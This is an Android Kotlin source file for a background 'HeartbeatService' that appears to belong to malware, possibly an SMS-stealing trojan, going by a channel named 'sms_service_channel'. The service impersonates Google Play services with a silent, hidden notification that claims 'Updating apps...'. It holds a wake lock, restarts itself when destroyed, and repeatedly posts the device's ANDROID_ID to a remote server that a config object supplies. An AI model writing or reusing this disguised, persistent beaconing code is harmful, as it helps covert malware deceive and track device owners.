package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class HeartbeatService : Service() {

    private lateinit var deviceId: String
    private val handler = Handler(Looper.getMainLooper())
    private var wakeLock: PowerManager.WakeLock? = null
    
    companion object {
        private const val TAG = "HeartbeatService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "sms_service_channel"
    }
    
    private val heartbeatInterval: Long
        get() = ServerConfig.getHeartbeatInterval()

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                sendHeartbeat()
                handler.postDelayed(this, heartbeatInterval)
            } catch (e: Exception) {
                Log.e(TAG, "Error in heartbeat runnable: ${e.message}", e)
                handler.postDelayed(this, 30000)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        
        com.example.test.utils.DirectBootHelper.logStatus(this)
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        try {
            ServerConfig.initialize(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize ServerConfig: ${e.message}")
        }
        
        acquireWakeLock()
        startForegroundNotification()
        
        handler.postDelayed({
            sendHeartbeat()
            handler.postDelayed(heartbeatRunnable, heartbeatInterval)
        }, 2000)
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$TAG::WakeLock"
            )
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock failed: ${e.message}")
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun sendHeartbeat() {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", true)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "HeartbeatService")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val urlString = "$baseUrl/devices/heartbeat"
                
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                
                if (responseCode in 200..299) {
                    conn.inputStream.bufferedReader().use { it.readText() }
                } else {
                    conn.errorStream?.bufferedReader()?.use { it.readText() }
                }
                
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat error: ${e.message}", e)
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        
        handler.removeCallbacks(heartbeatRunnable)
        
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock release failed: ${e.message}")
        }
        
        try {
            val restartIntent = Intent(applicationContext, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Restart failed: ${e.message}")
        }
    }
}